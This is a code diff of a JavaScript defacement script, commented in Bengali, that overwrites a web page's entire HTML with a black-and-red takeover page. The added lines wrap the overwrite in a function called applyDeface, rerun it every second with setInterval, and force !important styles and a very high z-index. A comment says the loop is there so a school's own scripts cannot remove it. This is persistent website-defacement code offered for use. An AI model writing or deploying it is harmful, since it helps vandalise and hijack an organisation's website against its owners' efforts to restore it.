@@ -1,4 +1,7 @@
-document.documentElement.innerHTML = `
+window.addEventListener('DOMContentLoaded', (event) => {
+    // পেজ লোড হওয়ার সাথে সাথে পুরো বডি এবং এইচটিএমএল লক করার জন্য
+    function applyDeface() {
+        document.documentElement.innerHTML = `
 <!DOCTYPE html>
 <html lang="bn">
 <head>
@@ -8,16 +11,14 @@ document.documentElement.innerHTML = `
     <style>
         :root {
             --blood-red: #ff0000;
-            --mobile-padding: 16px;
         }
         * {
             margin: 0; padding: 0; box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
         }
         body, html {
-            height: 100%; width: 100%; overflow-y: auto; overflow-x: hidden;
-            background-color: #000000; font-family: 'Courier New', Courier, monospace;
-            color: #ff0000; cursor: crosshair; scroll-behavior: smooth; position: relative;
+            height: 100% !important; width: 100% !important; overflow-y: auto !important; 
+            background-color: #000000 !important; font-family: 'Courier New', Courier, monospace;
+            color: #ff0000; position: relative;
         }
         .bg-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -25,7 +26,7 @@ document.documentElement.innerHTML = `
             opacity: 0.2; z-index: 1; pointer-events: none;
         }
         .wrapper {
-            position: relative; z-index: 2; max-width: 900px; margin: 0 auto;
+            position: relative; z-index: 999999 !important; max-width: 900px; margin: 0 auto;
             padding: 40px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
         }
         .warning-box { border: 2px solid #ff0000; background: rgba(255, 0, 0, 0.05); padding: 15px; margin-bottom: 30px; font-weight: bold; letter-spacing: 2px; width: 100%; }
@@ -53,7 +54,15 @@ document.documentElement.innerHTML = `
     </div>
 </body>
 </html>
-`;
+        `;
+    }
+
+    // সাথে সাথে একবার রান হবে
+    applyDeface();
+
+    // স্কুলের অন্য স্ক্রিপ্টগুলো যেন এটাকে সরাতে না পারে, সেজন্য একটা লুপ (Interval) রাখা হলো
+    setInterval(applyDeface, 1000);
+});
 
 // গ্লোবাল অডিও ট্রিগার
 document.addEventListener('click', function() {
